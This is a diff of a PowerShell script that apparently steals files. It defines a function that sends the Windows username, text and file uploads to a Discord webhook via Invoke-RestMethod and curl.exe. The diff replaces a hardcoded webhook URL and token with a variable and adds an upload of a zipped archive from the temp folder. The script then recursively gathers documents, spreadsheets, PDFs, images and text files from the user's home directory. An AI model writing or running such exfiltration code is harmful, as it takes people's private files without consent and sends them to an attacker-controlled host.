@@ -7,20 +7,22 @@
         [string]$text 
     )
 
-    $hookurl = 'https://discordapp.com/api/webhooks/1259447476172099616/L-bGHhxLxSy11ws-eaQjQxL7BxYxEYByUHNNwxMhRHsScsxozGlX19cE-lk1gHzrfeRA'
+    $hookurl = "$dc"
 
     $Body = @{
       'username' = $env:username
       'content' = $text
     }
 
-    if (-not ([string]::IsNullOrEmpty($text))) {
+    if (-not ([string]::IsNullOrEmpty($text))){
         Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
     }
 
-    if (-not ([string]::IsNullOrEmpty($file))) {
+    if (-not ([string]::IsNullOrEmpty($file))){
         curl.exe -F "file1=@$file" $hookurl
     }
+
+    if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 }
 
 $Files = Get-ChildItem -Path "$env:HOMEPATH" -Include "*.docx","*.doc","*.pptx","*.xlsx","*.pdf","*.jpeg","*.png","*.jpg","*.csv","*.txt" -Recurse
